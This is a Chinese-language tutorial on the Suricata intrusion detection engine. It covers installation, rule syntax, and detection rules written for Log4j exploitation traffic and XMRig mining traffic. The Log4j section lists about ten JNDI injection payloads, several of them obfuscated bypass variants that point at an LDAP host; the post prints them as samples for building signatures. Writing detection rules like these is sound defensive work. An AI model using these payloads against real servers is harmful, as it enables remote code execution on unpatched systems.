## 软件介绍

Suricata
是一个免费、开源、成熟、快速、健壮的网络威胁检测引擎。Suricata引擎能够进行实时入侵检测(IDS)、内联入侵预防(IPS)、网络安全监控(NSM)和离线pcap处理。Suricata
使用强大而广泛的规则和签名语言来检查网络流量，并提供强大的Lua脚本支持来检测复杂的威胁。使用标准的输入和输出格式(如YAML和JSON)，使用现有的SIEM、Splunk、Logstash/Elasticsearch、Kibana和其他数据库等工具进行集成将变得非常简单。Suricata项目和代码由开放信息安全基金会(OISF)拥有和支持，OISF是一个非盈利基金会，致力于确保Suricata作为一个开源项目的开发和持续成功。

suricata下载地址：

https://suricata.io/download/

英文官网

https://suricata.readthedocs.io/en/latest/index.html

中文官网

https://www.osgeo.cn/suricata/index.html

![1658015228_62d34dfc0ce14e5679d24.png!small?1658015228963](https://image.3001.net/images/20220717/1658015228_62d34dfc0ce14e5679d24.png!small?1658015228963)  
  
  
  
  
  
  
  

Suricata与Snort区别

Snort（由SourceFire开发和维护）一直是开源入侵检测/防御系统（IDS /
IPS）的实际标准。它的引擎结合了签名，协议和基于异常的检测的优点，并成为世界上应用最广泛的IDS / IPS。

Suricata是由OISF（开发信息安全基金会）开发，它也是基于签名，但是集成了创新的技术。该引擎嵌入了一个HTTP规范化器和分析器（HTP库），可提供非常先进的HTTP流处理，从而能够在OSI模型的第七层（应用层）上解析流量。

  

 **IDS** ：入侵检测系统（Intrusion detection
system，简称“IDS”）根据部署方式一般是一种对网络传输进行即时监视，根据预设的策略、检测规则，在发现可疑传输时产生告警。

 **IPS** ：入侵预防系统(Intrusion prevention
system，简称“IPS”)根据部署方式一般是一种能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，一般位于 **防火墙** 和 **网络**
的设备之间，能够 **即时的中断、调整或隔离** 一些不正常或是具有伤害性的网络资料传输行为。 **IPS相对于IDS主能提供了阻断防御功能。**

![1658015332_62d34e641686af52d51c4.png!small?1658015333025](https://image.3001.net/images/20220717/1658015332_62d34e641686af52d51c4.png!small?1658015333025)

  

## 软件安装

具体安装可以参见官方网站，在Linux下一般分为两种方式及离线（源码）和在线(二进制)。

目前最新版本已经为Suricata-6.0.5

![1658015415_62d34eb74617e6b014c04.png!small?1658015417182](https://image.3001.net/images/20220717/1658015415_62d34eb74617e6b014c04.png!small?1658015417182)

推荐使用Ubuntu，因为CentOS停止更新安装问题较多

### 离线包方式

tar xzvf suricata-6.0.5.tar.gz

cd suricata-6.0.5

./configure

make

make install

### 在线方式

二进制包方式（需要安装依赖）

sudo add-apt-repository ppa:oisf/suricata-stable

sudo apt-get update

sudo apt-get install suricata

## 常用语法

1.suricata规则语法

Suricata规则内容支持HTTP、
DNS、tcp、tls、udp、smb等协议的检测，同时支持十六进制、字符串、正则表达式进行匹配，引擎目前还支持Base64、url解码匹配。

规则所需关键字使用时可以根据需求在官方网站查询。由于这部分内容较多，这里不在做过多的赘述。下面将举例说明（最基本的框架）：

![1658015638_62d34f96d9146061aefa0.png!small?1658015639345](https://image.3001.net/images/20220717/1658015638_62d34f96d9146061aefa0.png!small?1658015639345)

  

alert http any any -> any any (msg:"这是一个例子"; flow:established,to_server;
content:"yunzui";nocase;fast_pattern; sid:6688; rev:1; metadata:created_at
2022_07_03,yunzui;)

#alert 命中

#http 协议

#any any -> any any 源IP 源端口 方向 目的IP 目的端口

#() 规则正文

#msg 显示信息

#flow:established,to_server; 流向 建立连接 到服务端

#content:"yunzui";nocase;fast_pattern; 检测字符串，不区分大小写，多摸快速匹配

#sid 规则唯一标识id

#rev 版本信息

#metadata 备注信息

2.常用关键字

1.content 提取匹配的特征内容

2.nocase 不区分大小写，nocase为content的修饰符，不需要跟参数

3.startswith content的修饰符，不需要跟参数，匹配content 以...开头

startswith 不能与 depth ， offset ， within 或 distance 混合使用

content:"GET|20|"; startswith; 匹配内容以`GET|20|`开头

等价于

content:"GET|20|"; depth:4;offset:0;

4.endswith

content的修饰符，不需要跟参数，匹配content 以...结尾

endswith 不能和 offset, within 或 distance混合使用

content:".php"; endswith;

等价于

content:".php";isdatat:!1,relative

5.isdataat

查看负载的特定部分是否仍有数据

isdataat:512; # 负载的512字节位置上，时候有数据 isdataat:8,relative; #
相对一上一次匹配位置开始的n个字节上是否有数据

![1658017200_62d355b0a95b6e44f3afe.png!small?1658017200827](https://image.3001.net/images/20220717/1658017200_62d355b0a95b6e44f3afe.png!small?1658017200827)

关键字很多，具体可以通过官方网站学习，这里不在做过多介绍。

## 实战检测运用

### 流量检测（log4j漏洞利用流量检测）

1.通过分析log4j漏洞利用原理及攻击常见payload

${jndi:ldap://10.211.55.2:8099/xobject}  
${jndi:ldap://127.0.0.1#10.211.55.2:8099/xobject}  
${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}${upper:d}${upper:a}${upper:p}://10.211.55.2:8099/xobject}  
${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://10.211.55.2:8099/xobject}  
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://10.211.55.2:8099/xobject}  
${${Lt::-j}${qAwQ:xz:-n}${j:j:-d}${PRX:jp:-i}:${r:M:-l}${::-d}${h:OjMc:-a}${OeR:iAob:-p}://10.211.55.2:8099/xobject}  
${${SFQv:jxfH:dhe:MNbb:n:-j}${hGS:w:N:-n}${:BAwG:A:QLo:-d}${mGFi:fjuO:::-i}:${:WhYw::-l}${X:ia::Pr:-d}${Bd:mrW:alo:-a}${N::-p}://10.211.55.2:8099/xobject}  
${${lower:${lower:j}}${lower:n}${lower:${lower:${lower:d}}}${lower:${lower:i}}:${lower:${lower:${lower:l}}}${lower:${lower:d}}${lower:${lower:${lower:a}}}${lower:${lower:${lower:${lower:p}}}}://10.211.55.2:8099/xobject}  
${${upper:${upper:${upper:${upper:j}}}}${upper:${upper:${upper:n}}}${upper:${upper:${upper:${upper:${upper:d}}}}}${upper:${upper:i}}:${upper:${upper:${upper:l}}}${upper:${upper:d}}${upper:${upper:${upper:${upper:${upper:a}}}}}${upper:p}://10.211.55.2:8099/xobject}  
${${upper:${upper:${upper:j}}}${lower:${lower:${lower:n}}}${lower:${upper:d}}${upper:${lower:i}}:${lower:${lower:${upper:${lower:l}}}}${lower:${lower:${upper:d}}}${upper:${lower:${upper:${lower:a}}}}${upper:${lower:p}}://10.211.55.2:8099/xobject}

![1658017961_62d358a9ae3d8e694894c.png!small?1658017961962](https://image.3001.net/images/20220717/1658017961_62d358a9ae3d8e694894c.png!small?1658017961962)

2.提取检测特征

漏洞分析复现，判断可能利用的姿势，提取检测特征，同时考虑上述bypass的payload,还有编码绕过等。

特征1 $

特征2 {}

特征3 jndi

特征4 ldap/ldaps/rmi/dns/iiop

特征5 lower

特征6 upper

特征7 http/tcp/dns

3.输出检测Suricata规则

目前就输出部分检测规则，有兴趣的可以自行研究

alert http any any -> any any (msg:"Apache Log4j远程命令执行漏洞(CVE-2021-44228)";
flow:to_server,established;http.request_line;content:"|24|";nocase;content:"|7b|";nocase;content:"jndi|3a|ldap|3a
2f 2f|";nocase;fast_pattern;sid:66666;rev:1;metadata: by yunzui;)

  
alert http any any -> any any (msg:"Apache Log4j远程命令执行漏洞(CVE-2021-44228)";
flow:to_server,established;http.header;content:"|24|";nocase;content:"|7b|";nocase;content:"jndi|3a|ldap|3a
2f 2f|";nocase;fast_pattern;sid:66667;rev:1;metadata: by yunzui;)

  
alert http any any -> any any (msg:"Apache Log4j远程命令执行漏洞(CVE-2021-44228)";
flow:to_server,established;http.request_body;content:"|24|";nocase;content:"|7b|";nocase;content:"jndi|3a|ldap|3a
2f 2f|";nocase;fast_pattern;sid:66668;rev:1;metadata: by yunzui;)

  
alert tcp any any -> any any (msg:"Apache Log4j远程命令执行漏洞(CVE-2021-44228)";
flow:established,to_server; content:"|24 7b|";
pcre:"/^(j|\x24\x7b(lower|upper)\x3aj\x7d|\x24\x7b\x3a\x3a\\-j\x7d)(n|\x24\x7b(lower|upper)\x3an\x7d|\x24\x7b\x3a\x3a\\-n\x7d)/Ri";
content:"|3a|"; distance:0; content:"|24 7b|env|3a|";
distance:0;sid:66669;rev:1;metadata: by yunzui;)

  
alert udp any any -> any any (msg:"Apache Log4j远程命令执行漏洞(CVE-2021-44228)";
content:"%7bjndi%3a"; nocase; fast_pattern;
pcre:"/^(l|r|d|(\x24|%24)(\x7b|%7b)(lower|upper)(\x3a|%3a)(l|r|d)(\x7d|%7d))(d|n|m|(\x24|%24)(\x7b|%7b)(lower|upper)(\x3a|%3a)(d|n|m)(\x7d|%7d))(a|i|s|(\x24|%24)(\x7b|%7b)(lower|upper)(\x3a|%3a)(a|i|s)(\x7d|%7d))(p|(\x24|%24)(\x7b|%7b)(lower|upper)(\x3a|%3a)p(\x7d|%7d))/Ri";sid:66670;rev:1;metadata:
by yunzui;)

4.测试检测效果

执行测试命令，正常检测攻击行为

![1658242988_62d6c7ac1ecea65e8bbe8.png!small?1658242989443](https://image.3001.net/images/20220719/1658242988_62d6c7ac1ecea65e8bbe8.png!small?1658242989443)

告警日志

![1658242947_62d6c7836290a559ee193.png!small?1658242948053](https://image.3001.net/images/20220719/1658242947_62d6c7836290a559ee193.png!small?1658242948053)

### 流量检测（xmrig挖矿行为流量检测）

1.通常挖矿由矿机和矿池构成，基本流程如下：

![1658243369_62d6c9296ee0446478967.png!small?1658243369877](https://image.3001.net/images/20220719/1658243369_62d6c9296ee0446478967.png!small?1658243369877)

  

2.提取检测特征

分析挖矿流量数据，进行特征提取

特征1 jsonrpc

特征2 method

特征3 agent":"XMRig/6.17.0

特征4 pool.minexmr.com

特征5 tcp/udp

3.输出检测Suricata规则

alert tcp any any -> any any (msg:"xmrig恶意挖矿行为"; flow:established,to_server;
content:"jsonrpc";nocase;content:"method"; nocase;distance:0;
content:"XMRig/6.17.0";nocase; fast_pattern;sid:8888;rev:1;metadata: by
yunzui;)

  

alert udp any any -> any any (msg:"xmrig恶意挖矿行为"; content:"pool.minexmr.com";
nocase; fast_pattern; sid:9999;rev:1;metadata: by yunzui;)

4.测试检测效果

执行测试命令，正常检测攻击行为![1658244888_62d6cf1877c1ea10a8f18.png!small](https://image.3001.net/images/20220719/1658244888_62d6cf1877c1ea10a8f18.png!small)

告警日志

![1658244819_62d6ced34ccc3f4d540d3.png!small?1658244819817](https://image.3001.net/images/20220719/1658244819_62d6ced34ccc3f4d540d3.png!small?1658244819817)

## 总结思考

流量对抗作为网络安全最关键、最重要的一个环节，针对流量的威胁检测显的尤为重要。同时以流量检测为支撑的安全产品层出不穷，其中
XDR（拓展检测响应）目前最受欢迎。而suricata目前作为开源的优秀网络流量检测引擎，并且不断进行了持续优化更新，不仅支持多种网络协议、常见编码、HTTP细分关键字等，大大提升了对威胁检测的有效性，希望对检测响应方向有兴趣的同学可以一起交流学习。

  

## 参考链接

https://www.cnblogs.com/linagcheng/p/12559922.html

https://mp.weixin.qq.com/s/tetX6YgCRSIpwan2XICZaA

https://www.iculture.cc/?s=%E6%8C%96%E7%9F%BF&type=post

  

  

  

